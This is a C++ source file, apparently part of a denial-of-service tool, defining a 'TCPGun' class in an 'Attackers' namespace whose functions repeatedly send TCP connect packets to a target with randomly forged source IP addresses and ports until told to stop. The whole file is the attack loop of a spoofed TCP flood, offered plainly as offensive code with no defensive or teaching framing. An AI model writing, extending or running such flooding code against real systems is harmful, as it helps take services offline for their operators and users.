#include <netdb.h>
#include <netinet/in.h>

#include "spdlog/spdlog.h"

#include "tcp_gun.h"

#include "api_interface.h"
#include "proxy_checker.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

std::size_t TCPGun::FireTillDead(const URI &targetToKill)
{
	std::size_t hitsCount{0};
	std::size_t errorsCount{0};

	while(!m_currentTask.ShouldStop())
	{
		if(!ShootTarget(targetToKill, hitsCount) ||
			++errorsCount > AttackerConfig::TCPAttacker::MAX_ERRORS_BEFORE_CHECK)
		{
			SPDLOG_WARN("Too many errors emited on TCP flooding, leaving");
			return false;
		}
	}

	return hitsCount;
}

bool TCPGun::ShootTarget(const URI &targetToShoot, std::size_t &hitsCount)
{
	size_t count = 0;
	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
			&& !m_currentTask.ShouldStop(); count++)
	{
		URI fakeSource{NetUtil::GetRandomIP()};
		fakeSource.SetPort(NetUtil::GetRandomPort());

		if(!m_attacker.SendConnectPacket(fakeSource, targetToShoot))
		{
			return false;
		}
		++hitsCount;
	}

	return true;
}
